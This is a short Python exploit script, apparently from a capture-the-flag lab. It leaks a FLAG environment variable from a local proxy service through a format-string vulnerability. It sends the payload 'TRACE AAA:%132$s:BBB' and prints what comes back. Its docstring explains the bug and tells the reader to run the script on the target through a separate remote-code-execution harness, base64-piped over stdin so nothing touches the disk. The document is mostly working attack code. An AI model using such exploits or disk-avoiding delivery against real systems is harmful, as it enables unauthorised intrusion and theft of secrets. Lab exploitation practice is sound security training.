#!/usr/bin/env python3
"""
'Bfr (Buffer) / SALVOR — format-string leak of the tlsproxy FLAG.

The /proxy service on 127.0.0.1:3001 passes the request buffer straight into
snprintf() as the format string (process_trace_request in proxy.c). A TRACE
request therefore evaluates format specifiers against the proxy's own stack;
offset 132 (%132$s) points at the process's FLAG= environment string.

:3001 is loopback-only, so run this *on the DSRepos box* via the Act-er RCE,
piping over stdin so nothing is written to the box's disk:
    B64=$(base64 -w0 temp.py)
    python3 ../Chapter_1_Act-er/exploit_harness.py \
        "echo $B64 | base64 -d | python3 -"
"""
import socket

s = socket.create_connection(("127.0.0.1", 3001))
s.settimeout(1)

s.sendall(b"TRACE AAA:%132$s:BBB\n")

data = b""

while True:
    try:
        chunk = s.recv(4096)
    except (socket.timeout, ConnectionResetError):
        break

    if not chunk:
        break

    data += chunk

s.close()

print(data.decode(errors="replace"))
